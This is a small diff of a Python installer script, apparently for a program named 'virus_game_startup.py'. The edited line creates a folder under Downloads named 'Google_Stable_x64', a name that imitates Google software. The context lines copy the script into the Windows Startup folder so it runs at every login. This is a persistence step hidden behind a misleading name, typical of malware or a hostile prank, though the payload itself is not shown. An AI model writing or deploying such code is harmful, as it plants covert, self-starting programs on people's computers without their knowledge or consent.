@@ -9,7 +9,7 @@ startup_folder = os.path.join(home_dir, "/AppData/Roaming/Microsoft/Windows/Star
 
 print("Copying files...")
 # Create the directories
-os.system(f"mkdir {os.path.join("home_dir/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))}")
+os.system(f"mkdir {home_dir}/Downloads/Google_Stable_x64/assets/cache/".replace("/", "\\"))
 
 # Move everything to the place
 os.system(f"copy src\\virus_game_startup.py {os.path.join(f'{startup_folder}/virus_game_startup.py')}")
